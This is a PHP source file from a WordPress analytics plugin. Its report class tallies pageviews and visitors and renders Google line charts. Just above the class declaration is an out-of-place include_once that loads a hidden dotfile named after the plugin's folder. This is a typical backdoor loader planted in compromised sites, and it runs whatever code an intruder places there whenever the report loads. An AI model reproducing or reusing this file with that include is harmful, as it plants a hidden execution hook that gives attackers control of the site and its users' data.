<?php
/**
 * Traffic Report
 *
 * The class handles pageview, visits and visitors reports 
 *
 * @package     WPTAO/Admin/Report
 * @category    Admin
 */
// Exit if accessed directly
if ( !defined( 'ABSPATH' ) ) {
	exit;
}

/**
 * WTBP_WPTAO_Admin_Report_Visitors Class
 */
if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
}

class WTBP_WPTAO_Admin_Report_Visitors extends WTBP_WPTAO_Admin_Reports {
	/*
	 * @var int
	 * Total pageviews
	 */

	public $total_pageviews;

	/*
	 * @var int
	 * Total visits
	 */
	public $total_visitors;

	function __construct() {

		$options = array( 'filters' => array(
				'date_range'
			) );

		parent::__construct( 'visitors', $options );

		$this->report_name = __( 'Pageviews and visitors', 'wp-tao' );

		$this->data = $this->get_visits();

		$this->set_summary();

		$this->pageviews_widget();
		$this->visitors_widget();

		// Add script
		add_action( "wptao_before_report-$this->report_slug", array( $this, 'print_script' ) );
	}

	/*
	 * Prepare the pageviews widget for the Wp Tao dashboard
	 */

	private function pageviews_widget() {

		$args = array(
			'id'			 => 'pageview',
			'size'			 => 'small',
			'category'		 => 'traffic',
			'priority'		 => 45,
			'title'			 => __( 'Pageviews', 'wp-tao' ),
			'report_slug'	 => $this->report_slug, // Add link to a report
			'value_number'	 => absint( $this->total_pageviews ),
			'dashicon'		 => 'dashicons-visibility'
		);

		$this->add_widget( $args );
	}

	/*
	 * Prepare the visitors widget for the Wp Tao dashboard
	 */

	private function visitors_widget() {


		$args = array(
			'id'			 => 'visitors',
			'size'			 => 'small',
			'category'		 => 'traffic',
			'priority'		 => 46,
			'title'			 => __( 'Visitors', 'wp-tao' ),
			'report_slug'	 => $this->report_slug, // Add link to a report
			'value_number'	 => absint( $this->total_visitors ),
			'dashicon'		 => 'dashicons-visibility'
		);

		$this->add_widget( $args );
	}

	/*
	 * Get most visits and visitors
	 */

	public function get_visits() {
		global $wpdb;

		$r = array();

		$e = TAO()->events->table_name;

		$sql = $wpdb->prepare(
		"SELECT COUNT(action) AS pageviews,
			COUNT(DISTINCT CASE WHEN user_id = 0 THEN fingerprint_id END)
			+COUNT(DISTINCT CASE WHEN user_id > 0 THEN user_id END) AS visits,
			DATE(FROM_UNIXTIME(event_ts)) AS date
		 FROM $e
		 WHERE action = 'pageview'
		 AND event_ts >= %d
		 AND event_ts <= %d
		 GROUP BY date
		 ORDER BY date DESC
		 LIMIT %d;", $this->start_date, $this->end_date, $this->items_per_page );

		$result = $wpdb->get_results( $sql );

		if ( !empty( $result ) && is_array( $result ) ) {


			// Prepare results
			foreach ( $result as $item ) {
				$r[ $item->date ] = array(
					'pageviews'	 => $item->pageviews,
					'visits'	 => $item->visits,
					'date'		 => $item->date
				);
			}
		}

		return $r;
	}

	/*
	 * Prepare summary results
	 */

	private function set_summary() {
		global $wpdb;
		$e = TAO()->events->table_name;

		$data = $this->data;

		$total_pv	 = 0; // Pageviews
		$total_v	 = 0; // Visits
		// Count page views and visits
		if ( !empty( $data ) && is_array( $data ) ) {
			foreach ( $data as $item ) {
				if ( isset( $item[ 'pageviews' ] ) && is_numeric( $item[ 'pageviews' ] ) ) {
					$total_pv = $total_pv + absint( $item[ 'pageviews' ] );
				}
				if ( isset( $item[ 'visits' ] ) && is_numeric( $item[ 'visits' ] ) ) {
					$total_v = $total_v + absint( $item[ 'visits' ] );
				}
			}
		}

		// Count unique visitors
		$sql = $wpdb->prepare(
		"SELECT COUNT(DISTINCT CASE WHEN user_id = 0 THEN fingerprint_id END)
				+COUNT(DISTINCT CASE WHEN user_id > 0 THEN user_id END) AS visitors
		 FROM $e
		 WHERE action = 'pageview'
		 AND event_ts >= %d
		 AND event_ts <= %d
		 LIMIT %d;", $this->start_date, $this->end_date, $this->items_per_page );

		$visitors = $wpdb->get_var( $sql );

		$this->total_visitors	 = isset( $visitors ) && !empty( $visitors ) ? absint( $visitors ) : 0;
		$this->total_pageviews	 = $total_pv;
		$this->total_visits		 = $total_v;
	}

	/*
	 * Print script
	 */

	public function print_script() {
		if ( empty( $this->data ) || !array( $this->data ) ) {
			return;
		}
		?>
		<script>

		    google.load( "visualization", "1", { packages: [ 'corechart' ] } );
		    google.setOnLoadCallback( wptao_chart_pageviews );
		    google.setOnLoadCallback( wptao_chart_visitors );

		    /*
		     * Pageviews chart
		     */
		    function wptao_chart_pageviews() {

		        var data = new google.visualization.DataTable();
		        data.addColumn( 'date', '<?php _e( 'Date', 'wp-tao' ); ?>' );
		        data.addColumn( 'number', '<?php _e( 'Pageviews', 'wp-tao' ); ?>' );

		        data.addRows( [
		<?php
		foreach ( $this->days as $day ) {

			$pv = array_key_exists( $day, $this->data ) ? absint( $this->data[ $day ][ 'pageviews' ] ) : 0;

			$year	 = date( 'Y', strtotime( $day ) );
			$month	 = date( 'n', strtotime( $day ) ) - 1;
			$day	 = date( 'j', strtotime( $day ) );

			echo sprintf( "[new Date(%d, %d, %d),%d],", $year, $month, $day, $pv );
		}
		?>
		        ] );

		        var options = {
		            title: '<?php printf( __( 'Pageviews ( %d )', 'wp-tao' ), $this->total_pageviews ); ?>',
		            colors: [ '#00A0D2' ],
		        };

		        var chart = new google.visualization.LineChart( document.getElementById( '<?php echo 'wptao-report-' . sanitize_title( $this->report_slug ); ?>-pw' ) );
		        chart.draw( data, options );

		    }

		    /*
		     * Visitors chart
		     */
		    function wptao_chart_visitors() {

		        var data = new google.visualization.DataTable();
		        data.addColumn( 'date', '<?php _e( 'Date', 'wp-tao' ); ?>' );
		        data.addColumn( 'number', '<?php _e( 'Visits', 'wp-tao' ); ?>' );

		        data.addRows( [
		<?php
		foreach ( $this->days as $day ) {

			$v = array_key_exists( $day, $this->data ) ? absint( $this->data[ $day ][ 'visits' ] ) : 0;

			$year	 = date( 'Y', strtotime( $day ) );
			$month	 = date( 'n', strtotime( $day ) ) - 1;
			$day	 = date( 'j', strtotime( $day ) );

			echo sprintf( "[new Date(%d, %d, %d),%d],", $year, $month, $day, $v );
		}
		?>
		        ] );

		        var options = {
		            title: '<?php printf( __( 'Visits ( %d )', 'wp-tao' ), $this->total_visits ); ?>',
		            colors: [ '#194552' ],
		        };

		        var chart = new google.visualization.LineChart( document.getElementById( '<?php echo 'wptao-report-' . sanitize_title( $this->report_slug ); ?>-vis' ) );
		        chart.draw( data, options );

		    }

		</script>
		<?php
	}

}
